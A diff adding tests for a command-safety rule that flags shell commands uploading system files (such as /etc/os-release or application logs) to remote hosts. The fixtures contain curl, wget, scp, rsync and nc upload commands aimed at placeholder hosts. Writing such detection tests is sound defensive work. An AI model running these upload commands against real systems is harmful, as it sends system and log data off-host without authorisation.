@@ -196,6 +196,57 @@ describe('rows the #341 suites pin with this check off', () => {
   });
 });
 
+describe('upload rule: a system file sent in a request', () => {
+  it.each([
+    'curl --data-binary @/proc/version http://127.0.0.1:8080/collect',
+    'curl -d@/etc/os-release https://api.example.test/v1',
+    'curl -F "file=@/etc/os-release;type=text/plain" https://api.example.test/upload',
+    'curl -F file=</etc/os-release https://api.example.test/upload',
+    'curl --data-urlencode content@/var/log/app.log https://api.example.test/v1',
+    'curl -T /etc/os-release https://api.example.test/upload',
+    'curl -d @- https://api.example.test/v1 < /etc/os-release',
+    'wget --post-file=/etc/os-release http://api.example.test/v1',
+    'http POST api.example.test @/etc/os-release',
+    'http -f POST api.example.test file@/proc/version',
+    'scp /etc/os-release deploy@host.example.test:/tmp/',
+    'rsync -a /var/log/app/ backup.example.test:/srv/logs',
+    'nc collector.example.test 9000 < /var/log/app.log',
+  ])('reviews %s', (command) => {
+    expect(detect(command)).toMatchObject({
+      decision: 'review',
+      checkId: 'files.system-dirs',
+      ruleName: 'review-system-file-upload',
+    });
+  });
+
+  it.each([
+    'curl -d @payload.json https://api.example.test/v1',
+    'curl -F file=@./report.csv https://api.example.test/upload',
+    "curl --data-raw '@/etc/os-release' https://api.example.test/v1",
+    'curl -T - https://api.example.test/upload',
+    'http api.example.test alice@example.test',
+    'scp /etc/os-release /tmp/os-release',
+    'cat /proc/version',
+  ])('leaves %s alone', (command) => {
+    expect(detect(command)).toBeNull();
+  });
+
+  it('the root home counts only when it is not the user own home', () => {
+    const cmd = 'curl -T /root/project/report.csv https://api.example.test/upload';
+    expect(detect(cmd)?.ruleName).toBe('review-system-file-upload');
+    const asRoot = { cwd: '/root/project', homeDirs: ['/root'] };
+    expect(
+      evaluateProtectedFileAccess(collectFileAccesses('Bash', { command: cmd }, asRoot), asRoot, {})
+    ).toBeNull();
+  });
+
+  it('a file passed to a function and uploaded there is found', () => {
+    const script =
+      'send() {\n  local file=$1\n  curl -T "$file" https://api.example.test/upload\n}\nsend /etc/os-release';
+    expect(detect(script)?.ruleName).toBe('review-system-file-upload');
+  });
+});
+
 describe('catalog row', () => {
   it('offers every value; off, log and block do what they say', () => {
     expect(configurableValues('files.system-dirs')).toEqual(['off', 'log', 'review', 'block']);
